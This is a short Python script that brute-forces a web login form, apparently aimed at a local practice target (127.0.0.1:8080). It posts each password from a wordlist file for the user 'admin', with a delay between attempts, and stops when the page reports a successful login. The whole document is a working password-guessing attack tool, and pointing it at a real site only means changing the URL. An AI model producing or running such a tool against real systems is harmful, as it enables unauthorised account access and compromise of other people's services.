import requests
from bs4 import BeautifulSoup
import time

url = "http://127.0.0.1:8080/login"
port = 8080
username = "admin"

with open("password.txt", 'r') as f:
    passwords = f.readlines()

for password in passwords:
    password = password.strip()
    data = {
        "username": username,
        "password": password
    }
    time.sleep(2)
    response = requests.post(url, data=data)
    soup = BeautifulSoup(response.text, "html.parser")

    if "LOGIN SUCCESSFUL!" in soup.get_text():
        print("Found!", password)
        break

    print("Trying to break...", password)